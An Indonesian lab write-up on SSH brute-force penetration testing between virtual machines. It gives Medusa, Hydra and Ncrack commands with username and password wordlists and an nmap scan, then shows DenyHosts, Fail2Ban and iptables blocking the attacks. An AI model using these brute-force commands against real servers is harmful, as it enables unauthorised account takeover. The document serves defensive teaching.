# A. Pendahuluan

Uji penetrasi(penetration test) adalah cara yang dapat digunakan unruk mengindentifikasi terentanan yang ada dalam sistem atau jaringan yang sudah memiliki langkah - langkah keamanan sebagai langkah preventif. Sebuah tes penetrasi biasanya melibatkan penggunaan metode yang dilakukan oleh individu yang terpercaya yang sengaja menyerang dengan logika yang sama seperti yang digunakan oleh penyusup dari luar atau hacker.

Tergantung pada jenis tes yang dilakukan, ini mungkin saja hanya melibatkan pemindaian sederhana sebuah alamat IP untuk mengidentifikasi mesin yang sedang beroperasi(live) atau dengan desain yang lebih tajam misalnya mengambil akases root/admin. Hasil penetration test ini atau serangan ini kemudian didokumentasikan dan disajikan sebagai laporan kepada pemilik sistem dan kerentanan diidentifikasi kemudian dapat diselesaikan.

Uji penetrasi yang akan dilakukan pada Ubuntu Server dan Kali Linux dimana Ubuntu server berperan sebagai host(yang diserang), sedangkan Kali Linux berperan sebagai pentester(yang menyerang).

# B. Dasar Teori

Untuk melakukan pengujian penetrasi diatas diperlukan beberapa tool. Yang utama adalah OS yang tertera diatas yaitu Ubuntu server dan juga Kali Linux. Disini OS yang kami gunakan terinstal pada sebuah virtual machine dengan main OSnya Windows. Adapun tool-tool yang digunakan pada uji penetrasi ini antara lain :

1. VMWare Workstation
   
   VMWare Workstation adalah software untuk virtual machine yang compatible dengan komputer Intel x86. Software ini memungkinkan pemakai untuk membuat satu atau lebih virtual machine dan menjalankannya secara serempak. Masing-masing virtual machine dapat menjalankan guest operating system-nya sendiri seperti Linux, Windows, BSD, dan lain-lain. Tetapi software ini tidak dapat menjalankan virtual machine yang dibuat oleh produk VMWare yang lain.

2. Ubuntu Server

   Linux Ubuntu Server adalah system operasi turunan dari Linux Ubuntu yang di desain khusus dengan kernel yang telah dikustomisasi untuk bekerja sebagai system operasi server. Kernel Linux Ubuntu Server di desain khusus untuk bisa bekerja dengan lebih dari satu proses (multiprocessor) dengan dukungan NUMA pada 100Hz internal timer frequency dan menggunakan pennjadwalan deadline I/O. 

   Linux Ubuntu Server memiliki lisensi open source dan gratis serta merupakan turunan dari distro linux debian sehingga memiliki keamanan yang cukup tinggi. Linux Ubuntu Server ini mempunyai kebutuhan minimum atau resource yang harus dipenuhi diantaranya adalah processor 300 MHz, Memory 64MB, Harddisk 500MB dan VGA 640×480. Namun untuk meningkatkan kinerja pada computer resource pada computer harus disediakan lebih tinggi.

3. Kali Linux

   Kali Linux adalah salah satu distribusi Linux tingkat lanjut untuk Penetration Testing dan audit keamanan. Distro ini dulunya adalah distro Backtrack, yang kemudian memutuskan mengganti nama distronya tersebut menjadi Kali Linux di versi terbarunya. Kali Linux ini akan dijadikan sebagai standarisasi distro Linux yang digunakan untuk percobaan penetrasi.

4. SSH Server

   SSH merupakan singkatan dari Secure Shell yang merupakan suatu aplikasi pengganti remote login yang tak jauh berbeda dengan RSH dan rlogin, dan merupakan suatu protokol jaringan. Dengan adanya SSH ini kita dapat menukarkan data melalui saluran yang aman anatra dua perangkat jaringan. Protokol jaringan ini sering digunakan pada sistem operasi linux. Enkripsi yang digunakan oleh SSH menyediakan kerahasiaan dan integritas data melalui jaringan yang tidak aman seperti Internet.

5. Brute Force Attack 

   Brute force attack adalah salah satu metode password cracking dengan cara mencoba semua kemungkinan kombinasi password yang disimpan didalam file wordlist. Kelemahan dalam meretas password menggunakan metode brute force ini memakan banyak waktu dan resource tergantung oleh panjang dan kombinasi karakter password yang akan diretas. Sebuah password dapat dibongkar dengan menggunakan program yang mencoba membuka password yang sudah terenkripsi dengan menggunakan algoritma tertentu dengan mencoba semua kemungkinan. Salah satu tools yang biasa digunakan dalam password cracking adalah medusa, hydra, ataupun ncrack. Dalam percobaan, akan dilakukan teknik brute force attack menggunakan tools medusa.

6. DenyHost
 
   Denyhosts adalah open source dan program keamanan berbasis log pencegahan intrusi gratis untuk server SSH dikembangkan di Python bahasa oleh Phil Schwartz. Ini digunakan untuk menganalisa terhadap serangan yang secara brutal atau berusaha memasuki server menggunakan SSH.

7. Fail2Ban
 
   Fail2ban adalah salah satu aplikasi yang digunakan untuk mencegah serangan brute force. Cara kerja fail2ban adalah dengan memblokir IP address yang memiliki ciri-ciri atau tanda-tanda serangan brute force terhadap sistem keamanan komputer (server). Fail2ban sangat diperlukan untuk menimalisir kemungkinan pengambilalihan server yang anda miliki. Kemungkinan-kemungkinan seperti itu bisa saja terjadi, apalagi jika IP server anda tersebut sudah tersebar ke seantero dunia maya. Kelebihan file2ban jika dibandingkan dengan software sejenis lainnya terletak pada banyaknya service yang dapat ditangani oleh fail2ban, seperti SSH (Openssh dan dropbear), FTP (proftpd dan vsftpd), email (postfix) dan banyak lagi service lainnya yang mampu ditangani oleh fail2ban. Selain itu file2ban juga terasa lebih simple, karena tidak perlu memasukan data IP yang mencoba untuk melakukan serangan brute force ke iptables untuk dilakukan pemblokiran satu-persatu.

# C. Uji Penetrasi 1

## 1. Langkah Instalasi Ubuntu Server
Ubuntu Server akan diinstall secara virtual menggunakan VMware yang sudah terinstall pada Windows 10. Sebelum menginstall Ubuntu Server tentu saja harus mendownload installer Ubuntu Servernya.
```
http://www.ubuntu.com/download/server
```
Setelah download selesai, langkah berikutnya adalah menginstall Ubuntu Server pada VMware.

1. Create a New Virtual Machine pada VMware Workstation kemudian akan muncul window baru seperti gambar dibawah ini

 [![u1.jpg](http://s5.postimg.org/msx07s85j/image.jpg)](https://postimg.org/image/ijsa5m4w3/)

 Untuk tipe konfigurasinya pilih Custom, karena akan ada yang harus diubah konfigurasinya. Kemudian klik Next

2. Pada window ini tidak perlu diubah konfigurasinya. Konfigurasinya kurang lebih seperti gambar dibawah ini. Klik Next untuk menuju windows selanjutnya.

 [![u2.jpg](http://s5.postimg.org/mhfjv0rpj/image.jpg)](https://postimg.org/image/nwh4jqssj/)

3. Pada window ini pilih lokasi installer yang sudah didownload sebelumnya.

 [![u3.jpg](https://s5.postimg.org/bvvoj0ldz/image.jpg)](https://postimg.org/image/a42po420z/)

 Klik Browse kemudian pilih lokasi installer Ubuntu Server. Setelah memilih lokasi installer klik Next untuk menuju window selanjutnya

4. Berikan nama untuk Virtual Machine yang akan dibuat.

 [![u4.jpg](https://s5.postimg.org/5w7xfd0lj/image.jpg)](https://postimg.org/image/hy3b9i9tv/)

 Berikan nama Virtual Machine yang akan dibuat sesuai keinginan. Jika ingin mengganti lokasi Virtual Machine yang akan diinstall bisa klik Browse kemudian pilih lokasi yang baru yang diinginkan. Klik Next untuk menuju windows selanjutnya.

5. Pilih jumlah processor dan juga core yang akan digunakan untuk menjalankan Virtual Machine ini

 [![u5.jpg](https://s5.postimg.org/od2c66gjr/image.jpg)](https://postimg.org/image/ue013935v/)

 Konfigurasi processor mengikuti processor yang digunakan pada komputer masing-masing. Supaya tidak terlalu memberatkan konfigurasi yang digunakan seperti gambar di atas.

6. Pilih jumlah memory yang akan digunakan

 [![u6.jpg](https://s5.postimg.org/4whmjnlfr/image.jpg)](https://postimg.org/image/jforl2ekj/)

 Konfigurasi memory disesuaikan dengan jumlah memory yang dimiliki komputer masing-masing. Komputer yang digunakan memiliki memory 8GB sehingga bila 1GB digunakan untuk menjalankan Virtual Machine tidak akan menjadi masalah.

7. Pilih tipe koneksi internetnya

 [![u7.jpg](https://s5.postimg.org/d39mb8bif/image.jpg)](https://postimg.org/image/6ct51socj/)

 Konfigurasikan seperti pada gambar di atas.

8. Pada window ini tidak perlu diubah konfigurasinya. Langsung klik next untuk menuju window selanjutnya

 [![u8.jpg](https://s5.postimg.org/w9res5hdz/image.jpg)](https://postimg.org/image/6e7o8yfk3/)

9. Pada window ini juga tidak diperlukan perubahan pada konfigurasinya. Klik next untuk menuju window selanjutnya.

 [![u9.jpg](https://s5.postimg.org/v8r6310ef/image.jpg)](https://postimg.org/image/lo7jg5b2b/)

10. Membuat Virtual Disk untuk Virtual Machine yang akan diinstall

 [![u10.jpg](https://s5.postimg.org/n4j1yadzb/U10.jpg)](https://postimg.org/image/5r8rjfio3/)

 Pilih sesuai gambar di atas untuk membuat Virtual Disk yang baru. Kemudian klik next

11. Pilih ukuran maksimum virtual disk yang diinginkan

 [![u11.jpg](https://s5.postimg.org/w0tu284lj/U11.jpg)](https://postimg.org/image/iwo9pjcjn/)

 Pada gambar di atas ukuran maksimum virtual disk adalah 20GB. Kemudian pilih Store virtual disk as single file untuk meningkatkan performa virtual disk yang akan dibuat.

12. Pada window ini nama virtual disk yang akan dibuat sama seperti penamaan Virtual Machine yang akan dibuat

 [![u12.jpg](https://s5.postimg.org/mubjexzd3/U12.jpg)](https://postimg.org/image/mubjexzcz/)

 Nama virtual disk bisa diganti sesuai keinginan. Untuk lebih mudahnya disamakan saja dengan nama Virtual Machinenya.

13. Pada window ini menampilkan seluruh konfigurasi untuk Virtual Machine yang akan dibuat.

 [![u13.jpg](https://s5.postimg.org/4sseh55c7/U13.jpg)](https://postimg.org/image/lgjwjn03n/)

 Klik next untuk memulai proses installasi Ubuntu Server

14. Lakukan proses installasi Ubuntu Server seperi menginstall ubuntu server pada komputer biasa.

 [![u14.jpg](https://s5.postimg.org/yyqsvxc93/U14.jpg)](https://postimg.org/image/jq0vi5ikj/)

15. Setelah Selesai akan muncul tampilan seperti pada gambar di bawah ini

 [![u15.jpg](https://s5.postimg.org/my5cv74uf/U15.jpg)](https://postimg.org/image/z00qpce2r/)

 Klik Continue untuk menjalankan Ubuntu Server

## 2. Langkah Instalasi Kali Linux

Untuk instalasi Kali Linux menggunakan Image untuk VMware yang bisa didownload melalui link berikut:
```
https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/
```
 [![k1.jpg](https://s5.postimg.org/luptwz9l3/image.png)](https://postimg.org/image/fts4zwmyr/)

Seperti gambar di atas pilih Kali Linux 64 bit VM untuk mendownload image VMware Kali Linux. File yang di download masih berupa file kompres.

1. Extract file kompres ke dalam folder yang diinginkan

  [![k7.jpg](https://s5.postimg.org/ajn68m2pz/image.jpg)](https://postimg.org/image/blxcr5lj7/)

 Pada gambar di atas file di extract ke D:\Master\Virtual Machine

2. Buka VMware Workstation dan pilih "Open a Virtual Machine"

 [![k2.jpg](https://s5.postimg.org/d62opjtxj/image.jpg)](https://postimg.org/image/jjrrssytf/)

 Kemudian pilih folder tempat menyimpan file hasil extract pada langkah sebelumnya. Cari file dengan extension *.vmx seperti pada gambar di atas. Kemudian klik open.

3. Klik Edit Virtual Machine settings

  [![k8.jpg](https://s5.postimg.org/rlg0aphl3/image.jpg)](https://postimg.org/image/saysn2i4j/)

  [![k9.jpg](https://s5.postimg.org/irp3tlumf/image.jpg)](https://postimg.org/image/fkuk9za6b/)

 Seperti gambar di atas konfigurasikan Virtual Machine sesuai kebutuhan yang tidak membebankan komputer yang digunakan.

4. Klik Power on this virtual machine
 [![k8.jpg](https://s5.postimg.org/rlg0aphl3/image.jpg)](https://postimg.org/image/saysn2i4j/)

 [![k3.jpg](https://s5.postimg.org/ad9h5itl3/image.jpg)](https://postimg.org/image/76exlw94z/)

5. Masukkan Username "root"
 [![k4.jpg](https://s5.postimg.org/ulwur8sw7/image.jpg)](https://postimg.org/image/5fvwkerlv//)
 Kemudian klik Next

6. Masukkan Password "toor"
  [![k5.jpg](https://s5.postimg.org/ckdptfyvb/image.jpg)](https://postimg.org/image/i8k0kc37n/)

 Kemudian klik Sign In

7. Tampilan desktop Kali Linux
  [![k6.jpg](https://s5.postimg.org/921px1xzb/image.png)](https://postimg.org/image/w3ib2sxmr/)

## 3. Langkah Instalasi SSH Server (OpenSSH)

Instalasi OpenSSH pada Ubuntu Server memanfaatkan package yang telah disediakan linux dengan melakukan get package maka OpenSSH akan terinstall pada Ubuntu Server

```
sudo apt-get install openssh-server
```

[![u16.jpg](https://s13.postimg.org/qoo454hd3/u16.jpg)](https://postimg.org/image/tvinor1sz/)

[![u17.jpg](https://s21.postimg.org/d5a4chrxj/u17.jpg)](https://postimg.org/image/p75i6n15v/)

[![u18.jpg](https://s21.postimg.org/lotia909z/u18.jpg)](https://postimg.org/image/thk62868z/)

Dengan memsukkan syntax diatas ke dalam terminal pada Ubuntu Server maka OpenSSH akan terinstall dengan pengaturan default

Untuk menjalankan OpenSSH dilakukan cara

```
sudo service ssh start
```

[![u20.jpg](https://s21.postimg.org/rfjonz89z/u20.jpg)](https://postimg.org/image/7868voasj/)

## 4. Langkah Instalasi SSH Brute Force Tools


#### 4.1 Medusa

Untuk melakukan brute force pada sebuah server dibutuhkan SSH Brute Force Tools, terdapat berbagai macam tools yang bisa digunakan diantaranya adalah Hydra, Ncrack, Medusa, dll.

Tools tersebut memiliki tujuan yang sama yaitu melakukan brute force pada sebuah server dengan memiliki daftar percobaan username serta password untuk dilakukan login secara brute force sehingga bisa didapatkan username serta password yang digunakan.

Cara melakukan penginstallan pada kali linux pun sama dalam melakukan penginstallan aplikasi lainnya pada sebuah OS Linux, yaitu melakukan get package pada server ubuntu  dengan syntax.

```
sudo apt-get install build-essential make patch subversion openssl libssl-dev libpq-dev libgcrypt11-dev libgnutls-dev libsvn-dev zlib1g-dev libssh2-1-dev libnl-dev gettext autoconf tcl8.5 libpcap0.8-dev python-scapy python-dev cracklib-runtime macchanger-gtk tshark ethtool
```

[![u21.jpg](https://s21.postimg.org/gtztbz1yf/u21.jpg)](https://postimg.org/image/wfh4vxdwj/)

Namun biasanya pada Kali Linux telah terinstall Brute Force Tools seperti medusa sehingga tidak perlu melakukan get package, namun bila tidak menggunakan Kali Linux bisa menggunakan syntax diatas atau dengan mendownload tar medusa dengan cara dibawah ini.

```
sudo wget http://www.foofus.net/jmk/tools/medusa-2.1.1.tar.gz -O – | sudo tar -xvz
```

```
cd medusa*
```

```
./configure
```

```
sudo make && sudo make install
```

Dengan kedua cara diatas maka Brute Force Tools Medusa akan terinstall pada Linux.


#### 4.2 Hydra

Untuk melakukan uji brute force dengan menggunakan hydra install terlebih dahulu toolsnya

```
sudo apt-get install hydra
```

#### 4.3 Ncrack

Untuk melakukan uji brute force dengan menggunakan ncrack install terlebih dahulu toolsnya

```
sudo apt-get install ncrack
```


## 5. Langkah Uji Penetrasi dengan SSH Brute Force Tools

#### 5.1 Medusa

Untuk melakukan serangan secara brute force terhadap sebuah server menggunakan tools medusa diharuskan memiliki daftar username serta password untuk dicoba secara brute force sampai didapatkan username dan password yang cocok.

Langkah awal dibuat terlebih dahulu daftar username untuk dicoba

```
cat > username.txt
```

Setelah syntax diatas dijalankan maka user tinggal memasukkan daftar username yang ingin dicoba diantaranya adalah

```
aloha
admin
root
toor
administrator
ubuntuserver
```

[![u24.jpg](https://s21.postimg.org/6nr7szhk7/u24.jpg)](https://postimg.org/image/pg32wkdyb/)

Selanjutnya dibuatkan daftar password yang akan dicoba

```
cat > password.txt
```

Setelah syntax diatas dijalankan maka user tinggal memasukkan daftar password yang ingin dicoba diantaranya adalah

```
admin
administrator
root
toor
tes
qwerty
```

[![u25.jpg](https://s21.postimg.org/ug0j4ijl3/u25.jpg)](https://postimg.org/image/wxcabs3hf/)

Setelah membuat daftar username serta password yang akan digunakan dalam melakukan brute force attack. Attacker pun harus mengetahui ip dari host yang akan di attack, selanjutnya dijalan syntax seperti dibawah ini

```
medusa -h IP HOST -U username.txt -P password.txt -M ssh
```

[![u27.jpg](https://s21.postimg.org/p7a3kdqjr/u27.jpg)](https://postimg.org/image/ky5di7nab/)

Hasilnya

[![u28.jpg](https://s21.postimg.org/3ywf2yc2v/u28.jpg)](https://postimg.org/image/9n2ptugf7/)

Syntax yang digunakan bisa seperti diatas apabila attacker memiliki daftar username serta password, namun bila attacker ingin mencoba melakukan attack dengan menggunakan satu username serta satu password bisa menggunakan syntax 

```
medusa -h IP HOST -u "admin" -p "admin" -M ssh
```

Dengan syntax diatas maka attacker melakukan attack dengan mencoba username admin serta password admin

Apabilan berhasil maka medusa akan memberikan feedback berupa username dan password yang digunakan oleh server seperti gambar dibawah ini

#### 5.2 Hydra

Untuk melakukan uji brute force dengan menggunakan hydra install terlebih dahulu toolsnya

```
sudo apt-get install hydra
```

Lalu dilakukan dengan daftar username serta password yang telah dibuat sebelumnya

```
hydra -L username.txt -P password.txt 192.168.137.144 ssh
```

[![u42.jpg](https://s21.postimg.org/w2ze0lrc7/u42.jpg)](https://postimg.org/image/3q3wa55lv/)

#### 5.3 Ncrack

Untuk melakukan uji brute force dengan menggunakan ncrack install terlebih dahulu toolsnya

```
sudo apt-get install ncrack
```

Lalu dilakukan dengan daftar username serta password yang telah dibuat sebelumnya

```
ncrack -p 22 --U username.txt -P password.txt 192.168.137.144
```

-p adalah port yang terbuka untuk melakukan penyerangan ssh dengan melihat terlebih dahulu port mana saja yang terbuka dengan cara

```
nmap 192.168.137.144
```

[![u43.jpg](https://s21.postimg.org/r5ltfhpd3/u43.jpg)](https://postimg.org/image/lhfioll0j/)

# D. Uji Penetrasi 2

### 1. Langkah Konfigurasi DenyHosts dan Fail2Ban

#### 1.1 DenyHosts

Ubuntu server harus menginstall DenyHosts terlebih dahulu dengan syntax 

```
sudo apt-get install denyhosts
```

Selain langkah diatas dapat dilakukan dengan cara

```
cd /tmp/ && wget http://downloads.sourceforge.net/project/denyhost/denyhost-2.8/denyhosts-2.8.tar.gz
```

[![u33.jpg](https://s21.postimg.org/yzhd3rquf/u33.jpg)](https://postimg.org/image/3sipzv2xv/)

```
tar xzf denyhosts*.tar.gz
```

[![u34.jpg](https://s21.postimg.org/5llmo6o4n/u34.jpg)](https://postimg.org/image/4w2ubtnkz/)

```
cd DenyHosts*
```

[![u35.jpg](https://s21.postimg.org/vv6p6za1z/u35.jpg)](https://postimg.org/image/4xcs58per/)

```
sudo python setup.py install
```

[![u36.jpg](https://s21.postimg.org/e6eyfcyav/u36.jpg)](https://postimg.org/image/qxt4lv82r/)

```
sudo cp /usr/local/bin/daemon-control-dist /etc/init.d/denyhosts
```

Setelah DenyHosts terinstall maka perlu dilakukan konfigurasi terlebih dahulu dengan merubah denyhosts bin dengan cara

```
sudo vi /etc/init.d/denyhosts
```

[![u39.jpg](https://s21.postimg.org/chax4eox3/u39.jpg)](https://postimg.org/image/6gd87c2ar/)

Rubah file tersebut seperti dibawah

```
###############################################
#### Edit these to suit your configuration ####
###############################################

DENYHOSTS_BIN = “/usr/local/bin/denyhosts.py”
DENYHOSTS_LOCK = “/run/denyhosts.pid”
DENYHOSTS_CFG = “/etc/denyhosts.conf”

PYTHON_BIN = “/usr/bin/env python”
```

User dapat menambahkan hosts yang diizinkan untuk melakukan login terhadap server dengan cara

```
sudo vi /etc/hosts.allow
```

Lalu tambahkan IP pada bagian paling bawah

```
# /etc/hosts.allow: list of hosts that are allowed to access the system.

# See the manual pages hosts_access(5) and hosts_options(5).
#
# Example: ALL: LOCAL @some_netgroup
# ALL: .foobar.edu EXCEPT terminalserver.foobar.edu
#
# If you’re going to protect the portmapper use the name “rpcbind” for the
# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.
#

sshd: 172.145.33.45 
```

Bila user tidak menambahkan hosts yang diperbolehkan maka DenyHosts memperbolehkan IP dalam subnet mask yang sama pada server untuk memperbolehkan host mengaksers server

#### 1.2 Fail2Ban

Install fail2ban pada Ubuntu Server dengan syntax

```
sudo apt-get install fail2ban
```

Setelah fail2ban diinstall pada ubuntu server lakukan konfigurasi sesuai dengan keinginan user

Pertama salin terlebih dahulu pengaturan yang ada pada fail2ban dengan syntax

```
awk '{ printf "# "; print; }' /etc/fail2ban/jail.conf | sudo tee /etc/fail2ban/jail.local
```

Kemudian rubah file tersebut

```
sudo nano /etc/fail2ban/jail.conf
```

Pada file tersebut ada beberapa fitur yang dapat dikonfigurasi diantaranya adalah

- IP Ignore

IP pengguna yang telah diatur agar tidak bisa mengakses server
```
[DEFAULT]
. . .
ignoreip = 127.0.0.1/8
. . .
```

- Bantime

Waktu dimana client akan di ban oleh server
```
[DEFAULT]
. . .
bantime = 600
. . .
```


- Findtime and Maxretry

Parameter dimana user dapat melakukan maksimal kesalahan dalam jangka waktu tertentu
```
[DEFAULT]
. . .
findtime = 600
maxretry = 3
. . .
```


### 2. Langkah Konfigurasi SSH Server dengan Menambahkan IPTABLES

Membuat Whitelist dari IPTABLE terlebih dahulu

`iptables -N SSH_WHITELIST`

Membuat trusted host yang diinginkan
`iptables -A SSH_WHITELIST -s TRUSTED_HOST_IP -m recent --remove --name SSH -j ACCEPT
`

Menambahkan rule blocking terlebih dahulu

```
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set \
 --name SSH
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j SSH_WHITELIST
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update \
 --seconds 60 --hitcount 4 --rttl --name SSH -j ULOG --ulog-prefix SSH_brute_force
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update \
 --seconds 60 --hitcount 4 --rttl --name SSH -j DROP
```

[![u46.jpg](https://s21.postimg.org/ly0qb18rr/u46.jpg)](https://postimg.org/image/xn4pyzzqb/)

Rule diatas akan memblock host setelah melakukan percobaan yang salah sebanyak 4 kali dalam waktu 60 detik

### 3. Langkah Uji Penetrasi dengan SSH Brute Force Tools

#### 3.1 Medusa

Untuk melakukan serangan secara brute force terhadap sebuah server menggunakan tools medusa diharuskan memiliki daftar username serta password untuk dicoba secara brute force sampai didapatkan username dan password yang cocok.

Langkah awal dibuat terlebih dahulu daftar username untuk dicoba

```
cat > username.txt
```

Setelah syntax diatas dijalankan maka user tinggal memasukkan daftar username yang ingin dicoba diantaranya adalah

```
aloha
admin
root
toor
administrator
ubuntuserver
```

Selanjutnya dibuatkan daftar password yang akan dicoba

```
cat > password.txt
```

Setelah syntax diatas dijalankan maka user tinggal memasukkan daftar password yang ingin dicoba diantaranya adalah

```
admin
administrator
root
toor
tes
qwerty
```

Setelah membuat daftar username serta password yang akan digunakan dalam melakukan brute force attack. Attacker pun harus mengetahui ip dari host yang akan di attack, selanjutnya dijalan syntax seperti dibawah ini

```
medusa -h IP HOST -U username.txt -P password.txt -M ssh
```

Syntax yang digunakan bisa seperti diatas apabila attacker memiliki daftar username serta password, namun bila attacker ingin mencoba melakukan attack dengan menggunakan satu username serta satu password bisa menggunakan syntax 

```
medusa -h IP HOST -u "admin" -p "admin" -M ssh
```

Dengan syntax diatas maka attacker melakukan attack dengan mencoba username admin serta password admin

Namun dikarenakan telah diberikan pengaturan maka medusa tidak dapat melakuka brute force attack 

[![u40.jpg](https://s21.postimg.org/uy5bv84vb/u40.jpg)](https://postimg.org/image/vawq1en4z/)

#### 3.2 Hydra

Untuk melakukan uji brute force dengan menggunakan hydra install terlebih dahulu toolsnya

```
sudo apt-get install hydra
```

Lalu dilakukan dengan daftar username serta password yang telah dibuat sebelumnya

```
hydra -L username.txt -P password.txt 192.168.137.144 ssh
```

[![u47.jpg](https://s21.postimg.org/rnlk934br/u47.jpg)](https://postimg.org/image/49dkx5meb/)

#### 3.3 Ncrack

Untuk melakukan uji brute force dengan menggunakan ncrack install terlebih dahulu toolsnya

```
sudo apt-get install ncrack
```

Lalu dilakukan dengan daftar username serta password yang telah dibuat sebelumnya

```
ncrack -p 22 --U username.txt -P password.txt 192.168.137.144
```

-p adalah port yang terbuka untuk melakukan penyerangan ssh dengan melihat terlebih dahulu port mana saja yang terbuka dengan cara

```
nmap 192.168.137.144
```

# E. Kesimpulan dan Saran

Dengan menggunakan brute force attack tools, server yang tidak memiliki fitur keamanan yang cukup baik tidak akan bisa menahan gempuran tools yang melakukan berkali-kali percobaan pada server untuk mendapatkan username serta password yang digunakan oleh server.

Tools yang cukup powerfull dalam menjalankan brute force attack adalah Hydra dikarenakan pada percobaan diatas, password dari server dapat diketahui hanya dalam waktu sembilan detik, dengan memiliki jumlah username lima serta password enam, lalu tools yang kedua adalah Medusa dengan memiliki waktu 57 detik, sedangkan yang terakhir adalah NCrack dengan catatan waktu 33 detik namun menggunakan satu percobaan username saja, tidak seperti kedua tools sebelumnya yang menggunakan lima percobaan username.

Countermeasure yang dapat dilakukan bermacam-macam, pengguna dapat menggunakan tools maupun merubah konfigurasi dari ssh itu sendiri. Seperti menambahkan IPTABLES pada ssh sehingga mengurangi kemungkinan untuk dilakukan brute force attack dikarenakan akan ada masa timeout apabila percobaan gagal dalam waktu tertentu dengan rentang waktu yang telah ditentukan. Selain merubah pengaturan pada ssh dapat pula ditambahkan tools agar lebih powerful sehingga attacker langsung tidak dapat melakukan penyerangan seperti fail2ban serta DenyHosts.

Disarankan untuk mengurangi kemungkinan server di brute force untuk mendapatkan username dan password server, sebaiknya server menambahkan IPTABLES pada ssh dan juga fail2ban. Saran berikutnya adalah mengganti secara berkala password server itu sendiri, password untuk server disarankan menggunakan kombinasi huruf besar dan kecil serta kombinasi dengan angka.